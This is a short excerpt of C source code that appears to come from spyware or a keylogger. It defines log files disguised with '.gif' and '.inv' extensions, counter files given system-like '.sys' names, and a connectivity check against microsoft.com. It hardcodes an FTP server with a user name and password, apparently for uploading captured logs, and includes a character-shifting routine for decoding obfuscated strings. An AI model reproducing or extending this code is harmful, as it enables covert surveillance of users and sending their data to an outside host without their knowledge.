...
char LocLogFileExt[] = ".inv";
char LogCountFile[] = "appmgmt.sys";

#define UPDATE_TIMER 3000

char SrvLogFileExt[] = ".gif";
char UplinkCountFile[] = "uicore32.sys";

char InternetCheckMask[] = "http://www.microsoft.com";
char FtpServer[] = "www.interlink.150m.com";
char FtpUserName[] = "interlink.150m.com";
char FtpPassword[] = "hackmycomputer";
...
void MakeProperString(char *String)
{
	register unsigned int i = strlen(String);
	while(i) String[i--] -= 1;
}
